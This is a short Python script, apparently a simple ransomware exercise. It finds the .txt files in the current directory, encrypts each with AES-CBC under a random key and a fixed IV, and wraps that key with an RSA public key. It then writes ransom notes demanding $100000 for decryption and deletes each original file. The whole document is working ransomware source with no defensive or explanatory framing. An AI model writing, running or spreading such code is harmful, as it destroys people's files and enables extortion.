import os
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# Load public key from file
with open('e.key', 'rb') as f:
    public_key = RSA.import_key(f.read())

result=subprocess.getoutput('ls')
files = result.split()

for i in files:
    if(i[-4:] == '.txt'):# Encrypt each file in directory ending with .txt
        with open(i, 'rb') as f:
            encrypted_data = f.read()
        
        aes_key = os.urandom(32)
        iv = b'0123456789ABCDEF'
        #pad
        padded_encrypted_data = pad(encrypted_data, AES.block_size)
        # encrypt using AES and constant iv
        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(padded_encrypted_data)

        # encrypt AES_key which will be the respective decryption key using public key
        cipher_rsa = PKCS1_OAEP.new(public_key)
        encrypted_aes_key = cipher_rsa.encrypt(aes_key)
        
        with open(f'{i}.encrypted', 'wb') as f:
            f.write(ciphertext)

        # writes data into the ID file with the aes key burned in, but inaccessible to humans
        with open(f'{i}.ID', 'wb') as f:
            f.write(encrypted_aes_key + ciphertext)

        with open(f'{i}.note', 'w') as f:
            f.write('You file has been compromised: Please Forward $100000 to Joey to receive the file AD6.py to get your decryption key\n')
            f.write('You have access to D6.py to restore your file once the decryption key is given using standard AES decryption and unpadding, the decryption key will be given in string format+\n')
            f.write(encrypted_aes_key.hex() + ciphertext.hex())
        os.remove(i)
